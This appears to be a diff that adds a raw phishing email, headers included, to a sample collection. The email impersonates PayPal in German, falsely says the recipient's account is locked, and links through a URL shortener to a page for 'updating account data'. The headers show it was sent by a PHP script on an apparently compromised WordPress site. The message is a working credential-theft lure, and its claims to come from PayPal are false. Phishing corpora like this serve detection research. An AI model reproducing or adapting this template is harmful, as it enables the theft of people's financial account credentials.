@@ -1,0 +1,253 @@
+Return-Path: support@husband.digital
+Delivered-To: jose@monkey.org
+X-FDA: 80596355574.26.005C114
+Received: from paultravers.co.uk (unknown [185.250.184.200])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP id 946FAA00E4
+	for <jose@monkey.org>; Wed, 22 Mar 2023 11:46:04 +0000 (UTC)
+Authentication-Results: imf12.b.hostedemail.com;
+	dkim=pass header.d=husband.digital header.s=default header.b=GDJoXorr;
+	spf=pass (imf12.b.hostedemail.com: domain of support@husband.digital designates 185.250.184.200 as permitted sender) smtp.mailfrom=support@husband.digital;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1679485565; a=rsa-sha256;
+	cv=none;
+	b=M4t/YdCPsKwK5PmsKUTJUg3llMpr+silf9+iaN4H0p3bhJ4kQ2htgMnOBdOUCkESMYCMwH
+	37Sy29My/O2iBdfs0cR5zutW65zvHWl9lRPQOkhadxcgs9986QXJYOrmRneeRgb70ANdrT
+	hb6/qp73ycuxa3Eu51Op/HALyWlq5vQ=
+ARC-Authentication-Results: i=1;
+	imf12.b.hostedemail.com;
+	dkim=pass header.d=husband.digital header.s=default header.b=GDJoXorr;
+	spf=pass (imf12.b.hostedemail.com: domain of support@husband.digital designates 185.250.184.200 as permitted sender) smtp.mailfrom=support@husband.digital;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1679485565;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=LyaJxWUNpLG8ZggICvb+77K+6AemXUXF9K+2jpg8oks=;
+	b=bTX8rpeVXWRMTXfgiu3qvnzkeyvGf9NTN6RPgFHYhVCoGPA5wkXDUWW4xlHTSfqd9znNun
+	tdpf3O0GdF77km5LOyLcNkkQbRYRU33dg+P+cZ8BlVVGKtnq5IzV73tlIPmqv09IDavOyi
+	R6F3tuNzLtNHLiXbIaManYqBWdvlYvs=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=husband.digital; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:From:Date:Subject:To:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=LyaJxWUNpLG8ZggICvb+77K+6AemXUXF9K+2jpg8oks=; b=GDJoXorr1zr1FJZ+4IPrBBa1yG
+	RsTkCFwn28CSxfS0FEk+PVMmWW8xCBY2i3Dso/6zlcIsy4yski3aIv+yq4B7jTk455jdK6Xqjrdf3
+	mpuq0AKqOfT7feS3dX2mM+Iwnp+DqC8TuuRyFdEDl0uT60IHSBsPHtXvGCDYDzxMRHVK8nMHSnDXE
+	Cp1H+t/sPBJAPjrwH+xpAvmgrWJnHL9Zio88DcHiR83xH7YgD1EO7cRG+7/Z8JDuKu4DLpSHGOwAi
+	PxMZZ7SE/E8gNK6HTKyaqmvSxOlFD+1ug2RNrdOuB+YDiOWFN+X/xae6lY3khf5i/BXYuL5AYN61i
+	0T71bOFg==;
+Received: from husbandpaul by web-21.cable.st with local (Exim 4.96)
+	(envelope-from <support@husband.digital>)
+	id 1peY1A-0002sM-1z
+	for jose@monkey.org;
+	Tue, 21 Mar 2023 09:10:57 +0000
+To: jose@monkey.org
+Subject: =?UTF-8?Q?Wir_haben_Ihr_Konto_vor=C3=BCbergehend_gesperrt?=
+X-PHP-Script: husband.digital/wp-content/d7tq8ohJ3al.php for 45.77.158.189
+X-PHP-Originating-Script: 1141:d7tq8ohJ3al.php
+Date: Tue, 21 Mar 2023 09:10:56 +0000
+From: PayPal <support@husband.digital>
+Message-ID: <4fbe2b70cecc9b9b06d4c582c0966df1@husband.digital>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_4fbe2b70cecc9b9b06d4c582c0966df1"
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - web-21.cable.st
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [1141 995] / [47 12]
+X-AntiAbuse: Sender Address Domain - husband.digital
+X-Get-Message-Sender-Via: web-21.cable.st: authenticated_id: husbandpaul/from_h
+X-Authenticated-Sender: web-21.cable.st: support@husband.digital
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam05
+X-Rspamd-Queue-Id: 946FAA00E4
+X-Stat-Signature: oeka679ni9pe7itjcqaan5ayeyctsq8w
+X-Rspam-User: 
+X-Spam-Status: No, score=5.26
+X-HE-Tag: 1679485564-90480
+X-HE-Meta: U2FsdGVkX19WwdeRLAMhUYOHcFGVRrhwHSKtzxceHxTagHZkhNYNpkf+NGRqQLKpygge1nBZTAqcjYoagRVIK/rwckywE4qklr8ncR0DeULrKlScRLkQCMsyphu8NVQm8VtszzQHEwxhGHV0oeLBTSHRPAr+xVENGs49Lmz38c/NK4okyFrEJOTbG09IPR/IggSsbnWXYlKrZNYuvDMzZ9Y6eydYcEDWwK7Tw7ro83tREpkBWQYW/v7I8YIFkm+q
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 51
+
+This is a multi-part message in MIME format.
+
+--b1_4fbe2b70cecc9b9b06d4c582c0966df1
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+PayPalWir haben Ihr Konto vorübergehend gesperrtLieber Kunde,Ihr Konto wurde vorübergehend eingeschränkt, um es zu schützen. Das Konto bleibt weiterhin eingeschränkt, bis es genehmigt wird. Nachdem Sie Ihre Kontodaten aktualisiert haben Ihre Informationen werden bestätigt und Ihr Konto funktioniert wieder wie gewohnt. Der Vorgang dauert nicht länger als 5 Minuten. Sobald Sie verbunden sind, folgen Sie den Schritten, um Ihr Konto zu aktivieren. Wir bitten um Ihr Verständnis, während wir daran arbeiten, die Sicherheit zu gewährleisten.Überprüfen Sie es jetzt&nbsp;Urheberrecht © 1999-2023 PayPal. Alle Rechte vorbehalten.
+
+
+--b1_4fbe2b70cecc9b9b06d4c582c0966df1
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<table dir=3D"ltr" align=3D"center" border=3D"0" cellpadding=3D"0" cellspac=
+ing=3D"0" width=3D"100%" style=3D"border-collapse: collapse; border-spacing=
+: 0px; padding: 0px; empty-cells: hide; color: rgb(34, 34, 34); font-family=
+: arial, sans-serif; font-size: 16px; background-color: rgb(243, 243, 243);=
+"><tbody><tr style=3D"font-size: 0px; border-collapse: collapse; border-spa=
+cing: 0px;"><td align=3D"center" valign=3D"top" style=3D"margin: 0px; borde=
+r-collapse: collapse; border-spacing: 0px; padding: 0px;"><div class=3D"m_-=
+3878704001089269956WRAPPER" style=3D"max-width: 600px; margin: auto;"><tabl=
+e class=3D"m_-3878704001089269956wrapper" align=3D"center" border=3D"0" cel=
+lpadding=3D"0" cellspacing=3D"0" width=3D"600" style=3D"border-collapse: co=
+llapse; border-spacing: 0px; padding: 0px; empty-cells: hide; width: 600px;=
+ max-width: 600px;"><tbody><tr style=3D"border-collapse: collapse; border-s=
+pacing: 0px;"><td style=3D"margin: 0px; border-collapse: collapse; border-s=
+pacing: 0px; padding: 0px;"><br></td></tr><tr style=3D"border-collapse: col=
+lapse; border-spacing: 0px;"><td valign=3D"top" align=3D"center" style=3D"m=
+argin: 0px; border-collapse: collapse; border-spacing: 0px; padding: 0px;">=
+<br></td></tr><tr style=3D"border-collapse: collapse; border-spacing: 0px;"=
+><td valign=3D"top" align=3D"center" style=3D"margin: 0px; border-collapse:=
+ collapse; border-spacing: 0px; padding: 0px;"><table border=3D"0" cellpadd=
+ing=3D"0" cellspacing=3D"0" align=3D"center" width=3D"100%" style=3D"border=
+-collapse: collapse; border-spacing: 0px; padding: 0px; empty-cells: hide; =
+margin: 0px;"><tbody><tr style=3D"border-collapse: collapse; border-spacing=
+: 0px;"><td valign=3D"top" align=3D"center" style=3D"margin: 0px; border-co=
+llapse: collapse; border-spacing: 0px; padding: 15px 0px;"><div style=3D"he=
+ight: 1px; line-height: 1px; border-top: 1px solid rgb(243, 243, 243);"><im=
+g alt=3D"" width=3D"1" height=3D"1" style=3D"display: block; box-sizing: bo=
+rder-box; font-size: 12px; margin: 0px !important; padding: 0px !important;=
+"></div></td></tr></tbody></table></td></tr><tr style=3D"border-collapse: c=
+ollapse; border-spacing: 0px;"><td valign=3D"top" align=3D"center" style=3D=
+"margin: 0px; border-collapse: collapse; border-spacing: 0px; padding: 0px;=
+"><table align=3D"center" width=3D"100%" border=3D"0" cellpadding=3D"0" cel=
+lspacing=3D"0" class=3D"m_-3878704001089269956text-block" style=3D"border-c=
+ollapse: collapse; border-spacing: 0px; padding: 0px; empty-cells: hide;"><=
+tbody><tr style=3D"border-collapse: collapse; border-spacing: 0px;"><td val=
+ign=3D"top" align=3D"center" class=3D"m_-3878704001089269956lh-1" style=3D"=
+margin: 0px; border-collapse: collapse; border-spacing: 0px; padding: 45px =
+50px 30px; background-color: rgb(255, 255, 255); line-height: 1.15;"><div s=
+tyle=3D"text-align: left;"><h1 style=3D"color: rgb(0, 0, 0); font-family: V=
+erdana;"><span style=3D"color: rgb(0, 44, 132);"></span><span style=3D"colo=
+r: rgb(0, 158, 222);"></span><strong style=3D"color: rgb(33, 33, 33); font-=
+family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span st=
+yle=3D"color: rgb(130, 130, 130); font-size: 28px; font-family: Verdana, se=
+rif, EmojiFont;"><em><font color=3D"#003084">P<span style=3D"color: inherit=
+;">a</span>y</font><font color=3D"#0098db">Pal</font></em></span></strong><=
+/h1></div><span style=3D"line-height: 1.1;"><h1 style=3D"color: rgb(85, 85,=
+ 85); font-family: Arial, sans-serif; text-align: left; margin: 20px 0px 5p=
+x; vertical-align: top; line-height: 23.4px; border-collapse: collapse; fon=
+t-size: 18px;">Wir haben Ihr Konto vor=C3=BCbergehend gesperrt</h1><div><br=
+></div><div><br></div><div style=3D"text-align: left;"><span style=3D"color=
+: rgb(86, 86, 86); font-family: Helvetica, Arial, sans-serif; font-size: 13=
+px; font-weight: bold;"><br></span></div><div style=3D"text-align: left;"><=
+span style=3D"color: rgb(86, 86, 86); font-family: Helvetica, Arial, sans-s=
+erif; font-size: 13px; font-weight: bold;">Lieber Kunde,</span></div><div s=
+tyle=3D"text-align: left;"><span style=3D"color: rgb(86, 86, 86); font-fami=
+ly: Helvetica, Arial, sans-serif; font-size: 13px;"><br></span></div><div s=
+tyle=3D"text-align: left;"><span style=3D"color: rgb(86, 86, 86); font-fami=
+ly: Helvetica, Arial, sans-serif; font-size: 13px;">Ihr Konto wurde vor=
+=C3=BCbergehend eingeschr=C3=A4nkt, um es zu sch=C3=BCtzen. Das Konto bleib=
+t weiterhin eingeschr=C3=A4nkt, bis es genehmigt wird. Nachdem Sie Ihre Kon=
+todaten aktualisiert haben</span><br style=3D"color: rgb(86, 86, 86); font-=
+family: Helvetica, Arial, sans-serif; font-size: 13px;"><br style=3D"color:=
+ rgb(86, 86, 86); font-family: Helvetica, Arial, sans-serif; font-size: 13p=
+x;"><span style=3D"color: rgb(86, 86, 86); font-family: Helvetica, Arial, s=
+ans-serif; font-size: 13px;"> Ihre Informationen werden best=C3=A4tigt und =
+Ihr Konto funktioniert wieder wie gewohnt. Der Vorgang dauert nicht l=C3=
+=A4nger als 5 Minuten. </span><br style=3D"color: rgb(86, 86, 86); font-fam=
+ily: Helvetica, Arial, sans-serif; font-size: 13px;"><br style=3D"color: rg=
+b(86, 86, 86); font-family: Helvetica, Arial, sans-serif; font-size: 13px;"=
+><span style=3D"color: rgb(86, 86, 86); font-family: Helvetica, Arial, sans=
+-serif; font-size: 13px;">Sobald Sie verbunden sind, folgen Sie den Schritt=
+en, um Ihr Konto zu aktivieren. Wir bitten um Ihr Verst=C3=A4ndnis, w=C3=
+=A4hrend wir daran arbeiten, die Sicherheit zu gew=C3=A4hrleisten.</span></=
+div></span></td></tr></tbody></table></td></tr><tr style=3D"border-collapse=
+: collapse; border-spacing: 0px;"><td valign=3D"top" align=3D"center" bgcol=
+or=3D"#ffffff" style=3D"margin: 0px; border-collapse: collapse; border-spac=
+ing: 0px; padding: 0px;"><table border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" align=3D"center" width=3D"100%" style=3D"border-collapse: collapse; =
+border-spacing: 0px; padding: 0px; empty-cells: hide;"><tbody><tr style=3D"=
+border-collapse: collapse; border-spacing: 0px; text-align: center;"><td st=
+yle=3D"margin: 0px; border-collapse: collapse; border-spacing: 0px;"><div c=
+lass=3D"m_-3878704001089269956column" style=3D"display: inline-block; width=
+: 300px; max-width: 100%; vertical-align: top; min-width: 300px !important;=
+"><table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" =
+class=3D"m_-3878704001089269956column-full-width" width=3D"100%" style=3D"b=
+order-collapse: collapse; border-spacing: 0px; padding: 0px; empty-cells: h=
+ide; width: 300px;"><tbody><tr style=3D"border-collapse: collapse; border-s=
+pacing: 0px;"><td valign=3D"top" align=3D"left" style=3D"margin: 0px; borde=
+r-collapse: collapse; border-spacing: 0px; padding: 0px;"><br></td></tr><tr=
+ style=3D"border-collapse: collapse; border-spacing: 0px;"><td valign=3D"to=
+p" align=3D"center" style=3D"margin: 0px; border-collapse: collapse; border=
+-spacing: 0px; padding: 0px;"><table border=3D"0" cellpadding=3D"0" cellspa=
+cing=3D"0" align=3D"center" width=3D"100%" style=3D"border-collapse: collap=
+se; border-spacing: 0px; padding: 0px; empty-cells: hide;"><tbody><tr style=
+=3D"border-collapse: collapse; border-spacing: 0px;"><td valign=3D"top" ali=
+gn=3D"center" bgcolor=3D"#ffffff" style=3D"margin: 0px; border-collapse: co=
+llapse; border-spacing: 0px; padding: 0px 0px 0px 20px;"><div style=3D"widt=
+h: 280px; margin-top: 0px; margin-bottom: 0px;"><table border=3D"0" cellpad=
+ding=3D"0" cellspacing=3D"0" align=3D"center" style=3D"border-collapse: col=
+lapse; border-spacing: 0px; padding: 0px; empty-cells: hide; margin: 0px au=
+to; text-align: center;"><tbody><tr style=3D"border-collapse: collapse; bor=
+der-spacing: 0px;"><td valign=3D"middle" align=3D"center" class=3D"m_-38787=
+04001089269956tdBlock" style=3D"margin: 0px; border-collapse: collapse; bor=
+der-spacing: 0px; display: inline-block; padding: 14px 50px; border-radius:=
+ 39px; border: 2px solid rgb(0, 175, 236);"><span style=3D"font-size: 12px;=
+ font-family: Helvetica, Arial, sans-serif; color: rgb(0, 175, 236);"><a hr=
+ef=3D"https://snip.ly/d162nx">=C3=9Cberpr=C3=BCfen Sie es jetzt</a></span><=
+/td></tr></tbody></table></div></td></tr></tbody></table></td></tr><tr styl=
+e=3D"border-collapse: collapse; border-spacing: 0px;"><td valign=3D"top" al=
+ign=3D"center" style=3D"margin: 0px; border-collapse: collapse; border-spac=
+ing: 0px; padding: 0px;"><br></td></tr><tr style=3D"border-collapse: collap=
+se; border-spacing: 0px;"><td valign=3D"top" align=3D"center" style=3D"marg=
+in: 0px; border-collapse: collapse; border-spacing: 0px; padding: 0px;"><br=
+></td></tr><tr style=3D"border-collapse: collapse; border-spacing: 0px;"><t=
+d valign=3D"top" align=3D"center" style=3D"margin: 0px; border-collapse: co=
+llapse; border-spacing: 0px; padding: 0px;"><table border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" align=3D"center" width=3D"100%" style=3D"border-co=
+llapse: collapse; border-spacing: 0px; padding: 0px; empty-cells: hide; mar=
+gin: 0px;"><tbody><tr style=3D"border-collapse: collapse; border-spacing: 0=
+px;"><td valign=3D"top" align=3D"center" style=3D"margin: 0px; border-colla=
+pse: collapse; border-spacing: 0px; padding: 19px 0px;"><div style=3D"heigh=
+t: 1px; line-height: 1px; border-top: 1px solid rgb(255, 255, 255);"><img a=
+lt=3D"" width=3D"1" height=3D"1" style=3D"display: block; box-sizing: borde=
+r-box; font-size: 12px; margin: 0px !important; padding: 0px !important;"><=
+/div></td></tr></tbody></table></td></tr></tbody></table></div>&nbsp;<div c=
+lass=3D"m_-3878704001089269956column" style=3D"display: inline-block; width=
+: 300px; max-width: 100%; vertical-align: top; min-width: 300px !important;=
+"><table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" =
+class=3D"m_-3878704001089269956column-full-width" width=3D"100%" style=3D"b=
+order-collapse: collapse; border-spacing: 0px; padding: 0px; empty-cells: h=
+ide; width: 300px;"><tbody><tr style=3D"border-collapse: collapse; border-s=
+pacing: 0px;"><td align=3D"center" valign=3D"top" bgcolor=3D"#ffffff" style=
+=3D"margin: 0px; border-collapse: collapse; border-spacing: 0px; padding: 0=
+px;"><br></td></tr></tbody></table></div></td></tr></tbody></table></td></t=
+r><tr style=3D"border-collapse: collapse; border-spacing: 0px;"><td valign=
+=3D"top" align=3D"center" style=3D"margin: 0px; border-collapse: collapse; =
+border-spacing: 0px; padding: 0px;"><table border=3D"0" cellpadding=3D"0" c=
+ellspacing=3D"0" align=3D"center" width=3D"100%" style=3D"border-collapse: =
+collapse; border-spacing: 0px; padding: 0px; empty-cells: hide; margin: 0px=
+;"><tbody><tr style=3D"border-collapse: collapse; border-spacing: 0px;"><td=
+ valign=3D"top" align=3D"center" style=3D"margin: 0px; border-collapse: col=
+lapse; border-spacing: 0px; padding: 15px 0px;"><div style=3D"height: 1px; =
+line-height: 1px; border-top: 1px solid rgb(243, 243, 243);"><img alt=3D"" =
+width=3D"1" height=3D"1" style=3D"display: block; box-sizing: border-box; f=
+ont-size: 12px; margin: 0px !important; padding: 0px !important; text-align=
+: left;"><div style=3D"text-align: left;"><span style=3D"font-size: 12px;">=
+Urheberrecht =C2=A9 1999-2023 PayPal. Alle Rechte vorbehalten</span>.</div>=
+</div></td></tr></tbody></table></td></tr><tr style=3D"border-collapse: col=
+lapse; border-spacing: 0px;"><td valign=3D"top" align=3D"left" style=3D"mar=
+gin: 0px; border-collapse: collapse; border-spacing: 0px; padding: 0px;"><b=
+r></td></tr><tr style=3D"border-collapse: collapse; border-spacing: 0px;"><=
+td valign=3D"top" align=3D"left" style=3D"margin: 0px; border-collapse: col=
+lapse; border-spacing: 0px; padding: 0px;"><br></td></tr><tr style=3D"borde=
+r-collapse: collapse; border-spacing: 0px;"><td style=3D"margin: 0px; borde=
+r-collapse: collapse; border-spacing: 0px; padding: 0px;"><br></td></tr></t=
+body></table></div></td></tr></tbody></table>
+
+
+--b1_4fbe2b70cecc9b9b06d4c582c0966df1--
+
+
